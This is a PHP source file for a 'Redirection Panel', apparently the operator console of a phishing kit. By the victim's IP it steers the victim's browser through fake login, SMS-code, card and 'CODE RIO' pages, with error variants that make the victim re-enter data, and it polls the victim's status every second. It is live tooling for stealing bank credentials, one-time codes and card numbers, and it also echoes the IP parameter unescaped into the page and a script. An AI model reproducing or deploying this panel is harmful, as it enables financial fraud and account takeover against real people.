<?php 
require 'panel.class.php';
$pnl = new Panel();

if(isset($_GET['page'], $_GET['ip'])){
    $pnl->editVicFIle($_GET['page'], $_GET['ip']);
    header("location: ctr.php?ip=".$_GET['ip']."&redirected");
}
if(isset($_POST['inst'])){
    $inst = $_POST['inst'];
    $ip = $_POST['ip'];
    $pnl->updateInst($ip, $inst);
    header("location: ctr.php?ip=".$_POST['ip']."&updated");
}
if(isset($_POST['device'])){
    $inst = $_POST['device'];
    $ip = $_POST['ip'];
    $pnl->updateDevice($ip, $inst);
    header("location: ctr.php?ip=".$_POST['ip']."&updated");
}
?>
<!doctype html>
<html>
<head>
<title>Redirection Panel</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="res/style.css">
</head>
<body>

<div class="btns">
<?php 


if(isset($_GET['redirected'])){
    echo "<h1>Redirected!</h1>";
}

if(isset($_GET['uploaded'])){
    echo "<h1>FILE UPLOADED!</h1>";
}
 
if(isset($_GET['updated'])){
    echo "<h1>DATA UPDATED!</h1>";
}
 

?>

<form>
    <span>[<?php echo @$_GET['ip'];?>] </span>
    <span>[<span id="statu">loading...</span>]</span>
</form>

<form action="ctr.php" method="get">
    <h3 style="color:white;">Control options</h3>
    <input type="hidden" name="ip" value="<?php echo @$_GET['ip'];?>">
    <button type="submit" name="page" value="login.php?e" style="background:red;">LOGIN ERROR</button>
    <button type="submit" name="page" value="app.php">APP</button>
    <button type="submit" name="page" value="info.php">INFO</button>
    <button type="submit" name="page" value="sms.php">SMS</button>
    <button type="submit" name="page" value="sms.php?e" style="background:red;">SMS ERROR</button>
    <button type="submit" name="page" value="card.php">CARD</button>
    <button type="submit" name="page" value="card.php?e" style="background:red;">CARD ERROR</button>
    <button type="submit" name="page" value="inst.php">INSTRUCTIONS</button>
    <button type="submit" name="page" value="inst2.php">INSTRUCTIONS 2</button>
    <button type="submit" name="page" value="rio.php" style="background:yellow; color:black;">CODE RIO</button>
    <button type="submit" name="page" value="rio.php?e" style="background:red;">CODE RIO ERROR</button>
    <button type="submit" name="page" value="done.php">SUCCESS</button>
    <button type="submit" name="page" value="exit.php">EXIT</button>
</form>

<form action="ctr.php" method="post" enctype="multipart/form-data" >
<h3 style="color:white;">Add Instruction</h3>
<input type="hidden" name="ip" value="<?php echo @$_GET['ip'];?>">
<textarea style="width:100%; height:200px;" placeholder="Write some instructions here..." name="inst"><?php echo @$pnl->getInst(@$_GET['ip']); ?></textarea>
<button type="submit">ADD</button>
</form>

</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>
    setInterval(() => {
        $.post("get_statu.php",{get:1, ip:'<?php echo @$_GET['ip']?>'},(res)=>{
            $("#statu").html(res);
        });
    }, 1000);
</script>

</body>
</html>